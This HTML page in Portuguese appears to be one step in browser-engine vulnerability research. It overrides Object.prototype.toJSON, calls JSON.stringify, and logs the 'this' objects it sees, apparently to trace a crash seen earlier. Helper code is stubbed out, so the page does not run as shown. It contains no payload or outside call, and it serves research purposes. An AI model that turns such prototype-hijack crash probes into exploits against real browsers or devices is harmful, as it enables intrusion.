<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PoC Isolado v2.3e - Identificando 'this' pelo Resultado</title>
    <style> /* ... (estilos como antes) ... */ </style>
</head>
<body>
    <h1>PoC Isolado v2.3e - Identificando 'this' pelo Resultado</h1>
    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste Isolado v2.3e</button>
    <div id="output"></div>

    <script>
        // AdvancedInt64 e generalUtils como antes...
        class AdvancedInt64 { /* ... (código completo como antes) ... */ }
        const generalUtils = { /* ... (código completo como antes) ... */ };

        const outputDivS1 = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const MEDIUM_PAUSE_S1 = 200;
        let callCount_toJSON_e = 0;

        const logS1 = (message, type = 'info', funcName = '') => {
            generalUtils.logToDiv('output', message, type, funcName);
        };
        const PAUSE_S1_FUNC = (ms = 50) => new Promise(r => setTimeout(r, ms));

        const originalTestObject_e = { a_root: 1, b_root: 'test_data_v23e', c_nested: { nested_prop_e: true, d_val_e: "deep_val_v23e" } };

        const testPPJsonHijack_v23e = async () => {
            const FNAME = 'testPPJsonHijack_v23e';
            logS1("--- Iniciando Teste v2.3e: Identificando 'this' pelo Resultado ---", 'test', FNAME);
            
            const ppKey = 'toJSON'; 
            let originalToJSON_Descriptor_e;
            let ppAppliedSuccessfully_e = false;
            callCount_toJSON_e = 0;
            let crashLikelyOccurred = true; // Assumimos que pode travar

            try {
                originalToJSON_Descriptor_e = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

                Object.prototype[ppKey] = function() {
                    callCount_toJSON_e++;
                    let logPrefix = `toJSON PoC v2.3e (Chamada ${callCount_toJSON_e})`;
                    
                    let thisDescription = `Unknown`;
                    let thisType = typeof this;
                    let constructorName = (this && this.constructor) ? this.constructor.name : 'N/A';

                    if (this === null) {
                        thisDescription = "this_is_null";
                    } else if (thisType === 'object') {
                        thisDescription = `this_is_object_constructor_${constructorName}`;
                        if (this === originalTestObject_e) thisDescription += "_ROOT";
                        else if (this === originalTestObject_e.c_nested) thisDescription += "_NESTED_C";
                        // Adicione mais 'else if' para outros sub-objetos se necessário
                    } else {
                        thisDescription = `this_is_primitive_${thisType}`;
                    }
                    
                    // Log SÍNCRONO ANTES de retornar. Este é o que tem mais chance de aparecer se travar no retorno.
                    // Usar console.log pode ser mais rápido que logS1 se o DOM for lento.
                    console.log(`${logPrefix} - RETORNANDO DESCRIÇÃO DE 'THIS': ${thisDescription}`);
                    logS1(`${logPrefix} - RETORNANDO DESCRIÇÃO DE 'THIS': ${thisDescription}`, 'critical', FNAME);

                    // NÃO CHAMA Object.keys(this) AQUI.
                    // Retorna uma descrição do 'this' atual.
                    return { 
                        toJSON_processed_this_description: thisDescription,
                        call_count: callCount_toJSON_e
                    };
                };
                ppAppliedSuccessfully_e = true;
                logS1(`Poluição Object.prototype.${ppKey} aplicada (v2.3e).`, 'info', FNAME);

                logS1(`Tentando JSON.stringify com originalTestObject_e...`, 'info', FNAME);
                const result = JSON.stringify(originalTestObject_e); 
                
                // Se chegar aqui, NÃO TRAVOU com esta estratégia de toJSON
                crashLikelyOccurred = false;
                logS1(`JSON.stringify CONCLUÍDO (v2.3e). Resultado:`, 'good', FNAME);
                logS1(result ? result : "N/A (string vazia ou nula)", 'info', FNAME); // Loga o resultado inteiro

            } catch (e) {
                crashLikelyOccurred = true; // Pode ter travado antes de capturar
                logS1(`Erro fatal capturado em testPPJsonHijack_v23e: ${e.message}`, 'error', FNAME);
                if (e.stack) logS1(`Stack do erro: ${e.stack}`, 'error', FNAME);
                console.error("JSON.stringify Crash Test Error (v2.3e):", e);
            } finally {
                if (ppAppliedSuccessfully_e) { 
                    if (originalToJSON_Descriptor_e) {
                        Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor_e);
                    } else {
                        delete Object.prototype[ppKey];
                    }
                    logS1(`Object.prototype.${ppKey} restaurado.`, 'good', 'Cleanup_v23e');
                }
                if (crashLikelyOccurred) {
                     logS1("AVISO: O script chegou ao 'finally', mas um crash pode ter ocorrido antes que 'crashLikelyOccurred' fosse definido como false. Verifique se há resultado.", 'warn', FNAME);
                }
            }
            logS1(`--- Teste JSON.stringify v2.3e Concluído ---`, 'test', FNAME);
            return !crashLikelyOccurred; // Retorna true se NÃO travou
        };

        const runIsolatedTest = async () => {
            if (runBtn) runBtn.disabled = true;
            outputDivS1.innerHTML = '';
            callCount_toJSON_e = 0;
            // Log inicial direto no console e na div
            console.log("runIsolatedTest (v2.3e) FOI CHAMADA!");
            outputDivS1.innerHTML = `<span class="log-test">[${new Date().toLocaleTimeString()}] [runIsolatedTest] Função runIsolatedTest (v2.3e) iniciada!</span>\n`;
            
            const successNoCrash = await testPPJsonHijack_v23e();
            
            await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
            logS1("\n==== PoC Isolado v2.3e CONCLUÍDO ====", 'test', 'runIsolatedTest');
            if (successNoCrash) {
                logS1("RESULTADO v2.3e: O teste NÃO TRAVOU. O resultado do JSON.stringify acima mostra a 'trilha' de objetos 'this' processados.", 'good', 'runIsolatedTest');
                logS1("Compare essa trilha com o comportamento esperado. O 'this' que anteriormente causava o crash com Object.keys(this) é um desses.", 'info', 'runIsolatedTest');
            } else {
                logS1("RESULTADO v2.3e: O teste TRAVOU ou um erro foi capturado. O problema pode ser mais fundamental do que apenas Object.keys(this).", 'error', 'runIsolatedTest');
            }
            if (runBtn) runBtn.disabled = false;
        };
    </script>
</body>
</html>
